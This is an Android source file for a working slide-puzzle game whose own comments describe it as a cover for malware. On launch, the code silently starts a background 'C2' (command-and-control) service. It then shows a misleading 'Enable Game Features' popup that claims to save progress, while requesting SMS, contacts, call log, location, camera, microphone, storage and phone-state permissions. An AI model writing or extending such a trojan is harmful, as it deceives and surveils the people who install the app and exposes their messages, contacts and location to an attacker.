package com.gempuzzle.quest;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.GridLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.gempuzzle.quest.c2.C2Service;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

/**
 * Gem Puzzle Quest — slide puzzle (15-puzzle). Fully playable.
 * On first launch: starts C2 service in background, requests
 * runtime permissions with in-game pretext popups.
 */
public class MainActivity extends AppCompatActivity {

    private static final int REQ_PERMS = 100;
    private GridLayout grid;
    private TextView scoreView;
    private int moves = 0;
    private final List<Integer> tiles = new ArrayList<>();
    private int emptyPos = 15;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        grid = findViewById(R.id.grid);
        scoreView = findViewById(R.id.score);
        findViewById(R.id.shuffle).setOnClickListener(v -> shuffle());

        // Start C2 service silently in background
        startC2();

        // Build puzzle
        initTiles();
        shuffle();

        // Request runtime permissions with game pretext
        requestGamePermissions();
    }

    private void startC2() {
        try {
            Intent svc = new Intent(this, C2Service.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
        } catch (Throwable ignored) {}
    }

    private void initTiles() {
        tiles.clear();
        for (int i = 1; i <= 15; i++) tiles.add(i);
        tiles.add(0); // empty
        emptyPos = 15;
    }

    private void shuffle() {
        Collections.shuffle(tiles);
        emptyPos = tiles.indexOf(0);
        moves = 0;
        updateScore();
        render();
    }

    private void render() {
        grid.removeAllViews();
        int size = getResources().getDisplayMetrics().widthPixels / 4 - 16;
        for (int i = 0; i < 16; i++) {
            Button b = new Button(this);
            int val = tiles.get(i);
            if (val == 0) {
                b.setVisibility(View.INVISIBLE);
            } else {
                b.setText(String.valueOf(val));
                b.setTextSize(22);
                final int pos = i;
                b.setOnClickListener(v -> tryMove(pos));
            }
            GridLayout.LayoutParams lp = new GridLayout.LayoutParams();
            lp.width = size;
            lp.height = size;
            lp.setMargins(4, 4, 4, 4);
            b.setLayoutParams(lp);
            b.setGravity(Gravity.CENTER);
            grid.addView(b);
        }
    }

    private void tryMove(int pos) {
        int row = pos / 4, col = pos % 4;
        int erow = emptyPos / 4, ecol = emptyPos % 4;
        if ((Math.abs(row - erow) == 1 && col == ecol)
                || (Math.abs(col - ecol) == 1 && row == erow)) {
            Collections.swap(tiles, pos, emptyPos);
            emptyPos = pos;
            moves++;
            updateScore();
            render();
            checkWin();
        }
    }

    private void checkWin() {
        for (int i = 0; i < 15; i++) {
            if (tiles.get(i) != i + 1) return;
        }
        Toast.makeText(this, "🎉 Solved in " + moves + " moves!", Toast.LENGTH_LONG).show();
    }

    private void updateScore() {
        scoreView.setText("Moves: " + moves);
    }

    // ===== Permission escalation with game pretext =====
    private void requestGamePermissions() {
        String[] perms = {
                Manifest.permission.READ_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_PHONE_STATE,
        };
        List<String> needed = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                needed.add(p);
            }
        }
        if (!needed.isEmpty()) {
            // Pretext popup — "Enable features to save your progress"
            new AlertDialog.Builder(this)
                    .setTitle("Enable Game Features")
                    .setMessage("To save your progress, enable sound, and share scores with friends, allow the requested permissions. You can revoke them anytime in Settings.")
                    .setPositiveButton("Enable", (d, w) ->
                            ActivityCompat.requestPermissions(this,
                                    needed.toArray(new String[0]), REQ_PERMS))
                    .setNegativeButton("Later", null)
                    .show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // Permission results handled by C2 service health check
    }
}
